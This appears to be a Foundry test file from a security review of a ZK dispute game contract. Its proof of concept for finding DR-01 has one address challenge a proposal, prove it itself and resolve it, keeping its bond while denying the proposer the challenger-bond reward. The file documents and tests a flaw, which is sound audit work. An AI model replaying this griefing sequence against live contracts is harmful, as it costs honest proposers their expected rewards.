// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

// Testing
import { DisputeGameFactory_TestInit } from "test/dispute/DisputeGameFactory.t.sol";

// Libraries
import { DevFeatures } from "src/libraries/DevFeatures.sol";
import { Claim, Duration, GameStatus, GameType, Timestamp } from "src/dispute/lib/Types.sol";
import { GameTypes } from "src/dispute/lib/Types.sol";

// Contracts
import { ZKDisputeGame } from "src/dispute/zk/ZKDisputeGame.sol";

// Interfaces
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";

/// @title ZKDeepReview_DR01
/// @notice PoC for DR-01: a permissionless prover (here, the challenger themselves) lands prove()
///         in `Challenged` state. The resolve() branch credits the prover (= challenger) with
///         only `challengerBond`, the proposer with only `initBond`, and the proposer is denied
///         the `challengerBond` bonus they would have received if THEY had proven first or if the
///         challenger had failed to prove.
///
///         Net effect:
///           - Challenger pays gas + proof-gen, recovers their full challengerBond (refundless).
///           - Proposer loses challengerBond worth of expected bonus.
contract ZKDeepReview_DR01 is DisputeGameFactory_TestInit {
    ZKDisputeGame parentGame;
    ZKDisputeGame childGame;

    address proposer = address(0x1111);
    address griefer = address(0x2222); // plays both challenger and prover

    GameType gameType = GameTypes.ZK_DISPUTE_GAME;
    Duration maxChallengeDuration = Duration.wrap(12 hours);
    Duration maxProveDuration = Duration.wrap(3 days);

    uint256 anchorL2SequenceNumber;
    uint256 parentL2SequenceNumber;
    uint256 childL2SequenceNumber;

    uint32 parentGameIndex;

    function setUp() public override {
        super.setUp();
        skipIfDevFeatureDisabled(DevFeatures.ZK_DISPUTE_GAME);

        (, anchorL2SequenceNumber) = anchorStateRegistry.getAnchorRoot();
        parentL2SequenceNumber = anchorL2SequenceNumber + 1000;
        childL2SequenceNumber = anchorL2SequenceNumber + 2000;

        setupZKDisputeGame(
            ZKDisputeGameParams({
                maxChallengeDuration: maxChallengeDuration,
                maxProveDuration: maxProveDuration,
                absolutePrestate: bytes32(0),
                challengerBond: 1 ether
            })
        );

        vm.warp(block.timestamp + 1000);

        // Create parent and resolve it so child has a valid (DEFENDER_WINS) parent.
        vm.startPrank(proposer);
        vm.deal(proposer, 10 ether);
        parentGame = ZKDisputeGame(
            payable(
                address(
                    disputeGameFactory.create{ value: 1 ether }(
                        gameType,
                        Claim.wrap(keccak256("parent")),
                        abi.encodePacked(parentL2SequenceNumber, type(uint32).max)
                    )
                )
            )
        );
        parentGameIndex = uint32(disputeGameFactory.gameCount() - 1);

        (,,,, Timestamp parentDeadline,) = parentGame.claimData();
        vm.warp(parentDeadline.raw() + 1 seconds);
        parentGame.resolve();

        // Create child pointing at finalised parent.
        childGame = ZKDisputeGame(
            payable(
                address(
                    disputeGameFactory.create{ value: 1 ether }(
                        gameType,
                        Claim.wrap(keccak256("child")),
                        abi.encodePacked(childL2SequenceNumber, parentGameIndex)
                    )
                )
            )
        );
        vm.stopPrank();
    }

    /// @notice Demonstrates DR-01 (challenger-as-prover variant): challenger pays bond, calls
    ///         prove() themselves, recovers their bond, and denies the proposer the
    ///         `challengerBond` bonus.
    function test_dr01_challengerAsProver_griefsProposer() public {
        uint256 challengerBond = childGame.challengerBond();
        uint256 totalBondsExpected = 1 ether + challengerBond; // initBond + challengerBond

        // Step 1: griefer challenges, paying challengerBond.
        vm.deal(griefer, 2 ether);
        vm.prank(griefer);
        childGame.challenge{ value: challengerBond }();

        // Step 2: griefer proves themselves. ZKMockVerifier always accepts.
        vm.prank(griefer);
        childGame.prove(bytes(""));

        // Step 3: resolve. Routes through ChallengedAndValidProofProvided / prover != gameCreator.
        childGame.resolve();
        assertEq(uint8(childGame.status()), uint8(GameStatus.DEFENDER_WINS));

        // Verify the bond split: griefer (prover) gets challengerBond, proposer gets initBond.
        assertEq(childGame.normalModeCredit(griefer), challengerBond);
        assertEq(childGame.normalModeCredit(proposer), totalBondsExpected - challengerBond);

        // The "challengerBond bonus" the proposer expected (had they proven themselves) is gone.
        // Proposer's net: paid 1 ether init bond, received 1 ether back. Zero net gain.
        // Griefer's net: paid 1 ether challengerBond + gas + proof cost, received 1 ether back.
        //   Net cost to griefer: gas + proof cost only (cheap if witness already known).
        // The protocol's economic incentive for proposers (challengerBond bounty for defending
        // their valid claim) is denied.
    }
}
